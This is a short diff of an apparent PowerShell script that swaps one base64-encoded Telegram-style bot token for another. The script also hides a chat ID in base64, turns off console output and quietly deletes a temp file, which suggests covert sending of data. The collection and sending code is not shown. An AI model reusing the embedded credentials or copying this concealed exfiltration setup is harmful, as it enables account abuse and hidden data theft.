@@ -2,7 +2,7 @@
 $VerboseMode = $false   # Set $true to enable Write-Host
 
 # ========== BASE64 CONFIG ==========
-$BotToken_B64 = "ODAzMTQzNTU3NjpBQUdkQ0dNNjNmdXF1VTVzSlI0ODVPV09qdW1rN1dJSFpDMA=="
+$BotToken_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
 $ChatID_B64 = "MTg0OTI2OTcwOA=="
 
 # Decode at runtime
@@ -98,3 +98,4 @@ catch {
 finally {
     if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }
 }
+
